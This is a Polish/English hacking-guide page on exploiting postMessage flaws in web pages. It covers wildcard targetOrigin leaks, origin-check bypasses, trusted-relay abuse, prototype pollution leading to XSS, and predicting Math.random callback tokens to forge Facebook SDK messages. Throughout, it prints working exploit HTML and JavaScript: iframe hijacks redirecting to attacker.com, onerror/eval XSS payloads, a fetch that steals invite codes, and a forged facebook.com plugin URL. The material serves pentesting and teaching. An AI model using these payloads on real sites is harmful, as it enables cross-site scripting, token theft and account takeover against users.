# Luki w PostMessage

{{#include ../../banners/hacktricks-training.md}}

## Wysyłanie **PostMessage**

**PostMessage** używa następującej funkcji do wysyłania wiadomości:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Zauważ, że **targetOrigin** może być '\*' lub URL-em takim jak _https://company.com._\
W **drugim scenariuszu**, **wiadomość może być wysłana tylko do tej domeny** (nawet jeśli origin obiektu Window jest inny).\
Jeśli użyty jest **wildcard**, **wiadomości mogą być wysyłane do dowolnej domeny**, i zostaną wysłane do origin obiektu Window.

### Atakowanie iframe & wildcard w **targetOrigin**

Jak wyjaśniono w [**tym raporcie**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), jeśli znajdziesz stronę, którą można **iframed** (brak ochrony `X-Frame-Header`) i która **wysyła poufną** wiadomość za pomocą **postMessage** używając **wildcard** (\*), możesz **zmodyfikować** **origin** **iframe** i **leak** **poufna** wiadomość do domeny kontrolowanej przez Ciebie.\
Zauważ, że jeśli strona może być iframed, ale **targetOrigin** jest **ustawiony na URL, a nie na wildcard**, ta **sztuczka nie zadziała**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** to funkcja używana przez JS do zadeklarowania funkcji, która **oczekuje `postMessages`**.\
Kod podobny do poniższego będzie użyty:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### Enumeration

In order to **find event listeners** in the current page you can:

- **Przeszukaj** kod JS pod kątem `window.addEventListener` i `$(window).on` (_JQuery version_)
- **Wykonaj** w konsoli narzędzi deweloperskich: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Przejdź do** _Elements --> Event Listeners_ w narzędziach deweloperskich przeglądarki

![](<../../images/image (396).png>)

- Użyj **rozszerzenia przeglądarki** jak [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) lub [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Te rozszerzenia przeglądarki **przechwycą wszystkie wiadomości** i pokażą je Tobie.

### Origin check bypasses

- **`event.isTrusted`** attribute is considered secure as it returns `True` only for events that are generated by genuine user actions. Though it's challenging to bypass if implemented correctly, its significance in security checks is notable.
- Użycie **`indexOf()`** do walidacji origin w eventach PostMessage może być podatne na obejście. Przykład ilustrujący tę podatność to:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Metoda **`search()`** z `String.prototype.search()` jest przeznaczona dla wyrażeń regularnych, nie dla zwykłych stringów. Przekazanie czegokolwiek innego niż regexp powoduje niejawne przekonwertowanie na regex, co może uczynić metodę potencjalnie niebezpieczną. Wynika to z faktu, że w regexie kropka (.) działa jako wildcard, pozwalając na obejście walidacji przy specjalnie spreparowanych domenach. Na przykład:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Funkcja **`match()`**, podobnie jak `search()`, operuje na regex. Jeśli regex jest źle skonstruowany, może być podatny na obejście.
- Funkcja **`escapeHtml`** ma na celu sanitizację wejścia przez escaping znaków. Jednak nie tworzy nowego escaped obiektu, lecz nadpisuje właściwości istniejącego obiektu. Takie zachowanie można wykorzystać. W szczególności, jeśli obiekt da się zmanipulować tak, że kontrolowana właściwość nie odpowiada na `hasOwnProperty`, `escapeHtml` nie zadziała jak oczekiwano. Pokazano to w poniższych przykładach:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

W kontekście tej podatności obiekt `File` jest szczególnie podatny ze względu na swoją tylko-do-odczytu właściwość `name`. Ta właściwość, gdy jest używana w szablonach, nie jest sanitizowana przez `escapeHtml`, co prowadzi do potencjalnych zagrożeń bezpieczeństwa.

- Właściwość `document.domain` w JavaScript może zostać ustawiona przez skrypt, aby skrócić domenę, co pozwala na bardziej luźne stosowanie polityki same-origin w obrębie tej samej domeny nadrzędnej.

### Origin-only trust + trusted relays

If a receiver only checks **`event.origin`** (e.g., trusts any `*.trusted.com`) you can often find a **"relay" page on that origin that echoes attacker-controlled params via `postMessage`** to a supplied `targetOrigin`/`targetWindow`. Examples include marketing/analytics gadgets that take query params and forward `{msg_type, access_token, ...}` to `opener`/`parent`. You can:

- **Otwórz stronę ofiary w popupie/iframe, który ma `opener`** aby jego handlery się zarejestrowały (wiele pixel/SDKów dołącza listenery tylko gdy `window.opener` istnieje).
- **Nawiguj inne okno atakującego do endpointu relay na zaufanym originie**, wypełniając pola wiadomości, które chcesz wstrzyknąć (typ wiadomości, tokeny, nonces).
- Ponieważ wiadomość pochodzi teraz **z zaufanego origin**, walidacja oparta tylko na origin przechodzi i możesz wywołać uprzywilejowane zachowania (zmiany stanu, wywołania API, zapisy w DOM) w listenerze ofiary.

Abuse patterns seen in the wild:

- Analytics SDKs (e.g., pixel/fbevents-style) consume messages like `FACEBOOK_IWL_BOOTSTRAP`, then **call backend APIs using a token supplied in the message** and include **`location.href` / `document.referrer`** in the request body. If you supply your own token, you can **read these requests in the token’s request history/logs** and exfil **OAuth codes/tokens** present in the URL/referrer of the victim page.
- Any relay that reflects arbitrary fields into `postMessage` lets you **spoof message types** expected by privileged listeners. Combine with weak input validation to reach Graph/REST calls, feature unlocks, or CSRF-equivalent flows.

Hunting tips: enumerate `postMessage` listeners that only check `event.origin`, then look for **same-origin HTML/JS endpoints that forward URL params via `postMessage`** (marketing previews, login popups, OAuth error pages). Stitch both together with `window.open()` + `postMessage` to bypass origin checks.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

It's possible to check if the message came from the same window the script is listening in (specially interesting for **Content Scripts from browser extensions** to check if the message was sent from the same page):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Możesz spowodować, że **`e.source`** wiadomości będzie null, tworząc **iframe**, który **wysyła** **postMessage** i jest **natychmiast usuwany**.

For more information **read:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Aby przeprowadzić te ataki idealnie będziesz w stanie **umieścić stronę ofiary** wewnątrz `iframe`. Jednak niektóre nagłówki, takie jak `X-Frame-Header`, mogą **uniemożliwić** takie **zachowanie**.\
W takich scenariuszach możesz nadal użyć mniej dyskretnego ataku. Możesz otworzyć nową kartę z podatną aplikacją webową i komunikować się z nią:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Wykradanie wiadomości wysłanej do child iframe przez zablokowanie głównej strony

W poniższej stronie możesz zobaczyć, jak można wykradać **poufne postmessage data** wysłane do **child iframe** przez **zablokowanie** **main** strony przed wysłaniem danych i wykorzystanie **XSS in the child** aby **leak the data** zanim zostaną odebrane:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Wykradanie wiadomości poprzez zmianę lokalizacji iframe

Jeśli możesz iframe'ować stronę bez X-Frame-Header, która zawiera inny iframe, możesz **zmienić lokalizację tego child iframe**, więc jeśli odbiera ona **postmessage** wysłany z użyciem **wildcard**, atakujący mógłby **zmienić** **origin** tego iframe na stronę **controlled** przez niego i **steal** wiadomość:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage do Prototype Pollution i/lub XSS

W scenariuszach, gdzie dane wysłane przez `postMessage` są wykonywane przez JS, możesz **iframe** stronę i **wykorzystać** **prototype pollution/XSS** wysyłając exploit przez `postMessage`.

Kilka bardzo dobrze opisanych XSS poprzez `postMessage` można znaleźć pod adresem [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Przykład exploita do wykorzystania **Prototype Pollution i następnie XSS** poprzez `postMessage` do `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Aby uzyskać **więcej informacji**:

- Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link to page about [**XSS**](../xss-cross-site-scripting/index.html)
- Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Allowlista zaufanych originów nie stanowi granicy

Ścisłe sprawdzenie `event.origin` działa tylko wtedy, gdy **zaufany origin nie może uruchamiać attacker JS**. Gdy uprzywilejowane strony osadzają iframe'y stron trzecich i zakładają, że `event.origin === "https://partner.com"` jest bezpieczne, każde XSS w `partner.com` staje się mostem do strony nadrzędnej:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Wzorzec ataku zaobserwowany w rzeczywistości:

1. **Exploit XSS in the partner iframe** and drop a relay gadget so any `postMessage` becomes code exec inside the trusted origin:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **Z poziomu strony atakującego**, wyślij JS do przejętego iframe, który przekaże do parenta dozwolony typ wiadomości. Wiadomość pochodzi z `partner.com`, przechodzi allowlist i zawiera HTML, który jest wstawiany w sposób niebezpieczny:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. Rodzic wstrzykuje złośliwy HTML, dając **wykonanie JS w parent origin** (np. `facebook.com`), które można następnie wykorzystać do kradzieży kodów OAuth lub eskalacji do pełnego przejęcia konta.

Key takeaways:

- **Partner origin isn't a boundary**: każde XSS w „zaufanym” partnerze pozwala atakującemu wysyłać dozwolone wiadomości, które obchodzą sprawdzenia `event.origin`.
- Handlery, które **renderują partner-controlled payloads** (np. `innerHTML` dla konkretnych typów wiadomości), czynią kompromitację partnera same-origin DOM XSS.
- Szeroka **message surface** (wiele typów, brak walidacji struktury) daje więcej gadgetów do pivotowania po kompromitacji iframe'a partnera.

### Predicting **`Math.random()`** callback tokens in postMessage bridges

When message validation uses a “shared secret” generated with `Math.random()` (e.g., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) and the same helper also names plugin iframes, you can recover PRNG outputs and forge trusted messages:

- Leak PRNG outputs via `window.name`: The SDK auto-names plugin iframes with `guid()`. If you control the top frame, iframe the victim page, then navigate the plugin iframe to your origin (e.g., `window.frames[0].frames[0].location='https://attacker.com'`) and read `window.frames[0].frames[0].name` to obtain a raw `Math.random()` output.
- Force more outputs without reloads: Some SDKs expose a reinit path; in the FB SDK, firing `init:post` with `{xfbml:1}` forces `XFBML.parse()`, destroys/recreates the plugin iframe, and generates new names/callback IDs. Repeated reinit produces as many PRNG outputs as needed (note extra internal `Math.random()` calls for callback/iframe IDs, so solvers must skip intervening values).
- Trusted-origin delivery via parameter pollution: If a first-party plugin endpoint reflects an unsanitized parameter into the cross-window payload (e.g., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), you can inject `&type=...&iconSVG=...` while preserving the trusted `facebook.com` origin.
- Predict the next callback: Convert leaked iframe names back to floats in `[0,1)` and feed several values (even non-consecutive) into a V8 `Math.random` predictor (e.g., Z3-based). Generate the next `guid()` locally to forge the expected callback token.
- Trigger the sink: Craft the postMessage data so the bridge dispatches `xd.mpn.setupIconIframe` and injects HTML in `iconSVG` (e.g., URL-encoded `<img src=x onerror=...>`), achieving DOM XSS inside the hosting origin; from there, same-origin iframes (OAuth dialogs, arbiters, etc.) can be read.
- Framing quirks help: The chain requires framing. In some mobile webviews, `X-Frame-Options` may degrade to unsupported `ALLOW-FROM` when `frame-ancestors` is present, and “compat” parameters can force permissive `frame-ancestors`, enabling the `window.name` side channel.

#### Minimal forged message example
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Źródła

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Do ćwiczeń: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
